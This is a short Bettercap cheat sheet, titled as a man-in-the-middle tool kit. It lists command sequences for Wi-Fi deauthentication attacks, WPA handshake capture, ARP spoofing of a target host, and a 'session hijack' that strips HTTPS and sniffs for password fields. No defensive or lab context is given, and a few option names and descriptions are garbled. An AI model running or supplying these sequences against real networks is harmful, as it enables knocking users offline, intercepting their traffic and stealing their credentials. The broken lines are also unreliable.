A MiTM tool kit

# Enter BetterCap 
- bettercap -iface (interfacename)
# Syntax 
- help               shows all the modules running and not
# Enable smth 
- (option)  on
# Options Available 
- wifi.recon                 wifi sniffer
-  net.sniff                   net sniffer
-  net.probe                net probe
# Show all WAP 
- wifi.show                 shows all the WAP (wireless access point)
- net.show                 same as wifi.show
# Wifi.recon 
- wifi.recon on                             turns on wifi.recon
- set wifi.recon .channel 3         sniffs packet in c3
# net.sniff 
- set net.sniff .verbose true                          sniffs the target in wifi.recon
- set net.sniff.filter ether proto 0x888e      
- set net.sniff.output (file)                            packet output file
- net.sniff on                                                 turns on the sniffer
# wifi.deauth
- wifi.deauth (bssid)                                    deauth attack
# Deauth
- wifi.recon on
- set wifi.recon.channel (channel)
- set net.sniff.verbose true
- set net.sniff.filter ether proto 0x888e
- set net.sniff.output (file)
- net.sniff on
- wifi.deauth on
- wifi.deauth (bssid)
# MiTM
- net.probe on
- net.show    (shows the targets within the network)
- set arp.spoof.fullduplex true
- set arp.spoof.targets (IP of the target in MiTM)
- arp.spoof on
# Session hijack 
- bettercap -iface (interface)
- net.probe on
- net.recon on
- set http.proxy.sslstrip true
- set arp.spoof.internal true
- set arp.spoof.targets (targetip)
- http.proxy on
- arp.spoof on
- net.sniff on
- set net.sniff.regexp '.\*password=.+'
- set http.proxy.sslstrip true
